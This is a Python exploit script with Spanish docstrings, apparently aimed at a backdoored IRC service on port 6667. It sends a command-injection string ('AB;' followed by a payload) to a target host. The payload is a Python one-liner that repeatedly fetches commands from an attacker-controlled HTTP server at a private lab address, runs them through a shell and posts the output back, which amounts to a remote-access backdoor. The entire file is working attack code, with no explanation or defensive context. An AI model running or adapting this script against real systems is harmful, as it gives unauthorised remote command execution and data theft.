import socket

class Exploit:
    """
    Esta clase permite conectar a un servidor remoto, enviar comandos específicos
    y ejecutar un payload de exploit.
    
    Attributes:
        host (str): Dirección IP del host al cual conectarse.
        port (int): Puerto TCP en el host remoto.
        sock (socket.socket): Objeto socket utilizado para la conexión.
    """

    def __init__(self, host: str, port: int):
        """
        Inicializa la instancia de la clase Exploit.

        Args:
            host (str): Dirección IP del host al cual se quiere conectar.
            port (int): Puerto TCP del servidor remoto.
        """
        self.host = host
        self.port = port
        self.sock = None

    def connect(self) -> bool:
        """Establece una conexión con el host y puerto especificados al crear la instancia.

        Returns:
            bool: True si la conexión fue exitosa, False si hubo un error.
        """
        try:
            self.sock = socket.create_connection((self.host, self.port))
            self.sock.recv(1024)
            return True
        except Exception as e:
            print(f"Error al conectarse a {self.host} en el puerto {self.port}: {e}")
            return False
        
    def send_command(self, command: str) -> str:
        """Envía un comando al servidor conectado a través del socket.

        Args:
            command (str): Comando a enviar al servidor.

        Returns:
            str: La respuesta del servidor después de enviar el comando, o None si ocurre un error.
        """
        try:
            self.sock.sendall(command.encode('utf-8'))
            return self.sock.recv(1024).decode('utf-8')
        except Exception as e:
            print(f"Error al enviar el comando {command}: {e}")
            return None
        
    def exploit(self):
        """Envía un payload al servidor.
        """
        payload = "python -c 'import urllib2, urllib, subprocess, time; server_ip = \"192.168.238.130\"; server_port = 8080; base_url = \"http://{}:{}\".format(server_ip, server_port); send_post = lambda data, endpoint=\"/\": urllib2.urlopen(urllib2.Request(base_url + endpoint, urllib.urlencode({\"response\": data}))); run_command = lambda command: send_post(subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]); [time.sleep(1) or run_command(urllib2.urlopen(base_url).read().strip()) for _ in iter(int, 1)]'"
        respuesta = self.send_command(f"AB; {payload} \n")
        print(f"Exploit enviado. Respuesta del servicio: {respuesta}")

    def run(self):
        """Método principal para iniciar el proceso de explotacion.
        """
        if self.connect():
            self.exploit()

if __name__ == "__main__":
    exploit = Exploit("192.168.238.131", 6667)
    exploit.run()